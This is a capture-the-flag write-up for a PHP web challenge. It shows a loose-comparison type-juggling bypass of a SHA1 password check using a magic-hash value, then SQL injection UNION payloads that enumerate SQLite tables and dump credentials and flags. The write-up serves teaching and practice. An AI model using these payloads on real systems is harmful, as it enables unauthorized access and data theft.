# DeconstruCT.F 2023

## why-are-types-weird

> Jacob is making a simple website to test out his PHP skills. He is certain that his website has absolutely zero security issues.
> 
> Find out the fatal bug in his website.
>
>  Author: N/A
>

Tags: _web_

## Solution
Inspecting the source code of the web application reveals a suspicious looking comment

```html
 <!-- <div class="container mt-3">
        <a href="source.php">View login source</a>
        <form method="get" action="/login.php">
            <div id="div_login">
                <h1>Admin Login</h1>
                <div>
                    <input type="text" class="textbox" id="txt_uname" name="txt_uname" placeholder="Username" />
                </div>
                <br>
                <div>
                    <input type="password" class="textbox" id="txt_pwd" name="txt_pwd" placeholder="Password" />
                </div>
                <br>
                <div>
                    <input type="submit" value="Submit" name="but_submit" id="but_submit" />
                </div>
            </div>
        </form>
    </div> -->
```

At the first glance it looks more or less like the form input sequence used for login a bit further down the code. But there is another link that points to `source.php`. Heading there we get the login source.

```php
<?php
if (isset($_GET['but_submit'])) {
    $username = $_GET['txt_uname'];
    $password = $_GET['txt_pwd'];
    if ($username !== "admin") {
        echo "Invalid username";
    } else if (hash('sha1', $password) == "0") {
        session_start();
        $_SESSION['username'] = $username;
        header("Location: admin.php");
    } else {
        echo "Invalid password";
    }
}
```

Ok, the username we look for is `admin`. For the password check a `sha1` hash is created and checked if it's `"0"`. There is no such `sha1` hash but the title mentioned `types` a pointer to php's famous [`type juggling`](https://www.php.net/manual/en/language.types.type-juggling.php) [`vulnerabilities`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md).

For `"0"` there are a handful of checks that lead `TRUE`.

```php
"0" == FALSE
"0" == 0
"0" == "0"
"0" == "0e1"
"0" == "0e99"
```

So any string that starts with `"0e"` will be returning `true` in this condition. After a short research once value that has a `sha1` hash starting with `0e` is `10932435112`.

```bash
$ echo -n "10932435112" | sha1sum
0e07766915004133176347055865026311692244  -
```

So we can login with `admin:10932435112`. After doing so there is a interface for querying user information by entering the user id. There are three users in total, but no admin. After some trial and error it looked like the application had a `sqli` injection vulnerability. Also the application leaked info by printing error messages, so it was clear that the database used was `sqlite`.

Checking first what tables we have, entering `id like "%" UNION SELECT name, null, null FROM  sqlite_master WHERE type ='table'` gives a list of all users along with some table names. Luckily there is a interesting table in the result `power_users`. This looks better than the `users` table we where looking in.

Another `UNION payload` finally reveiled the power users as well and with it admin and the flag.

```id like "%" UNION SELECT id, username, password FROM power_users``` 

```
ID      Username        Password
1       nottheadmin     dsc{1s_th1s_r34lLy_u53l3sS}
1       user1           password1
2       admin           dsc{tYp3_juGgl1nG_i5_cr4zY}
2       user2           password123
3       amitheadmin     dsc{n0_1m_n0t_th3_4dm1n}
```

Flag `dsc{tYp3_juGgl1nG_i5_cr4zY}`